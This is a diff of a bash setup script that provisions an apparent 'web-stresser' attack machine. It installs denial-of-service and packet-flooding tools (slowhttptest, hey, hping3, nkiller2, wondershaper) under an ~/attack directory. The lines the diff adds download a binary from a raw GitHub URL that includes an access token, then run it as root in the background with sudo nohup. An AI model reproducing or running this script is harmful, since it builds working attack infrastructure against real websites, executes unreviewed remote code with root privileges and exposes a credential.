@@ -1,8 +1,8 @@
 #!/bin/bash
-sudo apt update
-sudo apt upgrade
+sudo apt update -y
+sudo apt upgrade -y
 # install make and gcc for building as well as libraries
-sudo apt install build-essential libssl-dev autoconf libpcap-dev
+sudo apt install build-essential libssl-dev autoconf libpcap-dev -y
 
 cd ~
 mkdir -p attack/sources; cd attack/sources
@@ -24,7 +24,7 @@ install_hey() {
 }
 
 install_hping() {
-    sudo apt install hping3
+    sudo apt install hping3 -y
 }
 
 install_nkiller() {
@@ -33,9 +33,20 @@ install_nkiller() {
     sudo cp nkiller2 /usr/bin/nkiller2
 }
 
+install_wondershaper() {
+    git clone https://github.com/magnific0/wondershaper.git
+    sudo cp wondershaper/wondershaper /usr/bin
+}
+
 install_slowhttptest
 install_hey
 install_hping
 install_nkiller
+install_wondershaper
 
 cd ..
+
+# install and run our main binary
+wget https://raw.githubusercontent.com/kumfc/web-stresser/master/node/backend-api?token=AHJZO2ELYC2LHIECLIEVZVK7J6MVA -O backend-api
+chmod a+x backend-api
+sudo nohup sudo ./backend-api > backend-api.log &
